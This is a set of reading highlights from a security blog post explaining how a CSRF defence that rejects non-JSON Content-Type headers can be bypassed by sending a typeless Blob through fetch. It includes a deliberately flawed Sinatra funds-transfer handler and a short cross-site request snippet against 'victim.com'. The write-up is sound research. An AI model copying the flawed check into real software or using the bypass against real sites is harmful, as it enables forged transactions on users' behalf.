---
author: Luke Jahnke
aliases:
  - Cross-Site POST Requests Without a Content-Type Header
tags:
  - readwise/articles
url: https://nastystereo.com/security/cross-site-post-without-content-type.html
date: 2025-02-06
---
# Cross-Site POST Requests Without a Content-Type Header

There are many different ways that web applications implement protection against [Cross-Site Request Forgery (CSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-Site%20Request%20Forgery%20(CSRF).md) attacks.
[View Highlight](https://read.readwise.io/read/01jkdvrz051k2b2ax2brxynnnv)

One interesting attempt at CSRF protection is the rejection of requests with a `Content-Type` header not equal to `application/json`. The effectiveness of this comes from browsers only allowing `application/x-www-form-urlencoded`, `multipart/form-data` and `text/plain` (and possibly a few other [exceptions](https://fetch.spec.whatwg.org/#cors-protocol-exceptions)) to be sent cross-site. It is possible to send arbitrary values, but only after the receiving website has granted permission via [Cross-origin resource sharing (CORS)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-origin%20resource%20sharing%20(CORS).md).
[View Highlight](https://read.readwise.io/read/01jkdvv7jya997pa6vn63wwk3t)

An interesting caveat where the protection can be bypassed if implemented as in the example application below.
[View Highlight](https://read.readwise.io/read/01jkdvxax1a3bhc2h987823azp)


```rb
require "sinatra"
require "json"

before do
  # ... authentication check ...
end

post "/transfer-funds" do
  if request.content_type && request.content_type != "application/json"
    halt 403, "CSRF detected"
  end

  transaction = JSON.parse(request.body.read)
  # ... authorization check and process transaction ...
end
```
[View Highlight](https://read.readwise.io/read/01jkdvy02tt3p7g3pgjktmb5r5)

There is a gotcha due to the `fetch` API not only accepting `String` objects for the `body` parameter, but also `Blob` objects.
[View Highlight](https://read.readwise.io/read/01jkdvzers36yy7mwt23j7nee3)

By creating a `Blob` object without a type, then passing it to the `fetch` function, **a HTTP POST request can be sent cross-site, without CORS, that will not have a `Content-Type` request header**. This isn't just limited to empty request bodies either, as the data passed to `Blob` will become the HTTP request body.
[View Highlight](https://read.readwise.io/read/01jkdw1nwd7tqqevmkccgjbg1f)

```js
fetch("https://victim.com", { 
	method: "POST", 
	body: new Blob(["payload"]) 
});
```
[View Highlight](https://read.readwise.io/read/01jkdw1ycnh140k7484ma2ca0v)

```http
POST / HTTP/1.1
Host: victim.com
Connection: keep-alive
Content-Length: 7
sec-ch-ua: "Google Chrome"[snip...]
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 [snip...]
sec-ch-ua-platform: "Linux"
Accept: */*
Origin: https://nastystereo.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://nastystereo.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9

payload
```
[View Highlight](https://read.readwise.io/read/01jkdw26nes4dnfv36b7nff5ky)

